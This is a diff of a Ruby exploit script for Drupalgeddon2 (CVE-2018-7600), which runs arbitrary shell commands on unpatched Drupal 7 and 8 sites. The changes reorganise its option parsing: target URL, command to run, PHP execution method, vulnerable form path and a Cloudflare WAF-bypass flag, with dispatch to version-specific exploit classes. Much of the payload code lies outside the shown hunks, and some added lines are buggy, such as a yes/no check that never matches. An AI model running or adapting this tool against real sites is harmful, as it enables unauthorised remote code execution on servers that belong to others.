@@ -1,51 +1,13 @@
 #!/usr/bin/env ruby
 
 # This version works both Drupal 8.X and Drupal 7.X
-
-require 'base64'
-require 'json'
+require 'bundler/inline'
+require 'optionparser'
+require 'readline'
 require 'net/http'
 require 'openssl'
-require 'nokogiri'
-require 'optparse'
-
-options = {}
-options[:cloudflare] = false
-
-OptionParser.new do |opts|
-  opts.banner = "Usage example: ./drupalgeddon-customizable-beta.rb -u http://example.com/ -v 7 -c id\nMore info: -h"
-  options[:banner] = opts.banner
-
-  opts.on("-u URL", "--url URL", "[Required] Service URL") do |d|
-    options[:url] = d
-  end
-
-  opts.on("-v VERSION", "--version VERSION", "[Required] Target Drupal version {7,8}") do |d|
-    options[:version] = d
-  end
-
-  opts.on("-c COMMAND", "--command COMMAND", "[Required] Command to execute") do |d|
-    options[:command] = d
-  end
-
-  opts.on("-m PHP_METHOD", "--method PHP_METHOD", "[Optional] PHP Method to use, by default: passthru") do |d|
-    options[:command] = d
-  end
-
-  opts.on("--form", "[Optional] Form to attack, by default '/user/password' in Drupal 7 and '/user/register' in Drupal 8") do |d|
-    options[:form] = d
-  end
-
-  opts.on("--cloudflare", "[Optional] Tries to bypass Cloudflare using Lua-Nginx +100 parameters WAF Bypass") do |d|
-    options[:cloudflare] = true
-  end
-
-  opts.on("-h", "--help", "Prints this help") do
-    puts opts
-    exit
-  end
-
-end.parse!
+require 'base64'
+require 'json'
 
 #
 # Utils module for general and unrelated operations
@@ -65,11 +27,55 @@ module Utils
   # Dark grey | Feedback for the overkill
   def verbose(text); "\e[#{90}m[v]\e[0m #{text}"; end
 
+
+  # Interactive Console prompt to get user's input.
+  # @param [String] question
+  #   The question you want to print to the user
+  # @param [String] answer
+  #   The user's answer
+  # @return  [String]
+  # 
+  def ask(question, answer = nil)
+    answer = Readline.readline("#{question}", true) while answer.nil? || answer.squeeze.strip.empty?
+    answer
+  end
+
+  def self.banner
+    "\n" + "\e[4m==[::#Drupalggedon2::]==\e[0m".center(83, '--') + "\n"      +
+    "\e[1mRCE CVE-2018-7600\e[0m".center(83, ' ') + "\n" +
+    "Drupal 8.5.x < 8.5.1 / 8.4.x < 8.4.6 / 8.x < 8.3.9 / 7.x? < 7.58 / < 6.x?\n" +
+    "-" * 75 + "\n"
+  end
+
 end
 
 # 
-# All target related operations
+# Check external gems and install it automatecally
 # 
+begin
+  require 'nokogiri'
+rescue Exception => e
+  include Utils
+  puts error('Missing gems.')
+  yes = ask(action('Do you want me to install it for you?[y/n] '))
+  if yes[0] == /y/i
+    puts action('Installing missing gems...')
+    gemfile do
+      source 'https://rubygems.org'
+      gem 'nokogiri', require: true
+    end
+    puts success('Done')
+  else
+    puts info('As you like. Good Bye!')
+    puts e
+    exit!
+  end
+end
+
+
+#
+# All target related operations
+#
 class Target
   include Utils
 
@@ -228,9 +234,9 @@ class Drupal7 < Target
 
       if res2.body.split('[{"command"')[0] == ""
         if(@command != 'id')
-          error("Maybe incorrect input command, try simple command as 'id'")
+          puts error("Maybe incorrect input command, try simple command as 'id'")
         end
-          error("")
+        puts error("")
       end
 
       puts res2.body.split('[{"command"')[0]
@@ -240,19 +246,129 @@ class Drupal7 < Target
   end
 end
 
-# Read in values
-target     = options[:url]
-version    = options[:version]
-command    = options[:command]
-php_method = options[:method] || 'passthru'
-form_path  = options[:version] == '7' ? 'user/password' : 'user/register'
-cf_bypass  = options[:cloudflare]
 
-case version
-when "7"
-  Drupal7.new(target, command, php_method, form_path, cf_bypass).exploit
-when "8"
-  Drupal8.new(target, command, php_method, form_path, cf_bypass).exploit
-else
-  Drupal8.new(target, command, php_method, form_path, cf_bypass).exploit
+# 
+# Option module to handle all command line options operations
+# 
+module Options
+
+  # exploit_drupal select the proper exploit for the targeted version
+  # 
+  # @param [Integer] version
+  #   The drupal version
+  # @param [String] target
+  #   The target URL
+  # @param [String] command
+  #   The command to be executed on the target after exploit
+  # @param [String] php_method
+  #   The PHP method to be exploited
+  # @param [String] form_path
+  #   The form path to be exploited
+  # @return The exploit ;)
+  # 
+  # FIXME: what about authentication?
+  # 
+  def exploit_drupal(version, *args)
+    host, command, php_method, 
+    form_path, cf_bypass       = args 
+    
+    case version
+    when "7"
+      Drupal7.new(host, command, php_method, form_path, cf_bypass).exploit
+    when "8"
+      Drupal8.new(host, command, php_method, form_path, cf_bypass).exploit
+    else
+      Drupal8.new(host, command, php_method, form_path, cf_bypass).exploit
+    end
+  end
+
+  # cedentials method parses the given credentials seperated by column(:)
+  # 
+  # @param [String] creds
+  #   @example:
+  #     "root:Password@123"
+  # @return [Hash]
+  #   a hash contains {user: the_user, pass: the_pass}
+  def credentials(creds)
+    user, pass = creds.split(":", 2)
+    {user: user, pass: pass}
+  end
+
+  def form_path(path)
+    case path
+    when 0 then '/?q=user/password'
+    when 1 then '/user/password'
+    else
+      '/?q=user/password'
+    end
+  end
+
+end
+
+include Utils 
+include Options
+
+options = {}
+option_parser = OptionParser.new
+option_parser.banner = Utils.banner
+option_parser.set_summary_indent '   '
+option_parser.separator "\n\e[4mHelp menu:\e[0m"
+option_parser.on('-u', '--URL <TARGET_URL>',
+                 'The target URL to exploit.'
+) {|v| options[:url] = v || ''}
+option_parser.on('-a', '--authentication <USERNAME:PASSWORD>',
+                 "Drupal authentication. If the option selected without giving credentials, you'll be asked later."
+) {|v| v.kind_of?(String) ? options[:auth] = credentials(v) : options[:auth] = nil}
+
+option_parser.on('-v', '--version <TARGET_VERSION>',
+                 'Target Drupal version {7,8}.'
+) {|v| options[:version] = v}
+
+option_parser.on('-c', '--command <COMMAND>',
+  'Target Drupal version {7,8}.'
+) {|v| options[:command] = v}
+
+option_parser.on('-m', '--method <PHP_METHOD>',
+  'PHP Method to use. (default: passthru)'
+) {|v| options[:php_method] = v}
+
+option_parser.on('-p', '--form-path <FORM_PATH>',
+  'The form path to be used. (default: 0)',
+  "form_path: 0 => Vulnerable form on /?q=user/password\n" + 
+  "form_path: 1 => Vulnerable form on /user/password"
+) {|v| options[:form_path] = v}
+
+option_parser.on('--verbose',
+  'Print output verbosely.'
+) {|v| options[:verbose] = v}
+option_parser.on('-h', '--help', 'Show this help message') {puts option_parser; exit!}
+option_parser.on_tail "\nUsage:\n" + 
+                      "ruby drupalggedon2.rb -h <target> -v <version [7,8]> -c <command> -m [php_method] -p [form_path]"
+option_parser.on_tail "\nExample:"
+option_parser.on_tail %Q{ruby drupalgeddon-customizable-beta.rb -u http://example.com/ -v 7 -c id}
+
+
+begin
+  option_parser.parse!(ARGV)
+
+  exploit_drupal(options[:version], options[:url]) if options[:version] && options[:url]
+  
+  exploit_drupal(options[:version], options[:url],
+                 options[:command], options[:php_method],
+                 form_path(options[:form_path]))   if options[:version] && options[:url] &&
+                                                      options[:command] && options[:php_method] &&
+                                                      options[:form_path]
+
+  puts Utils.banner, option_parser    if options.empty?
+rescue OptionParser::MissingArgument => e
+  e.args.each {|arg| puts error("#{e.reason.capitalize} for '#{arg}' option.")}
+  puts option_parser
+rescue OptionParser::InvalidOption => e
+  puts error(e)
+  puts option_parser
+rescue Exception => e
+  puts error("Unknown Exception: option parser")
+  puts error(e)
+  puts e.backtrace_locations
+  puts warning('Please report the issue at: https://github.com/dreadlocked/Drupalgeddon2/issues')
 end
